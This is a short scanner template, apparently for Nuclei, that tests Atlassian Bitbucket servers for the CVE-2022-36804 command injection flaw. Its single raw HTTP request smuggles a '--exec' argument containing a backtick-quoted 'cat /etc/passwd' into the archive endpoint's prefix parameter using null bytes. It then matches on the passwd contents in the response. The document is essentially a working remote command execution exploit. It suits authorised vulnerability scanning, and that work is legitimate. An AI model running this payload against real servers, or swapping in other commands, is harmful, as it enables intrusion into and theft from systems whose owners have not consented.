id: poc-yaml-atlassian-bitbucket-archive-cve-2022-36804-remote-command-exec

info:
  name: poc-yaml-atlassian-bitbucket-archive-cve-2022-36804-remote-command-exec
  author: Cysec
  severity: high
  tags: xray-converted,rce,cve-2022-36804,ct-478520
  reference:
    - http://wiki.peiqi.tech/wiki/webapp/Atlassian%20Bitbucket/Atlassian%20Bitbucket%20archive%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2022-36804.html

http:
  - raw:
      - |
        GET /rest/api/latest/projects/BIZEE/repos/bizee-communication-api/archive?filename=wN3Am&at=wN3Am&path=wN3Am&prefix=ax%00--exec=%60cat%20/etc/passwd%60%00--remote=origin HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: regex
        part: body
        regex:
          - "root:.*?:[0-9]*:[0-9]*:"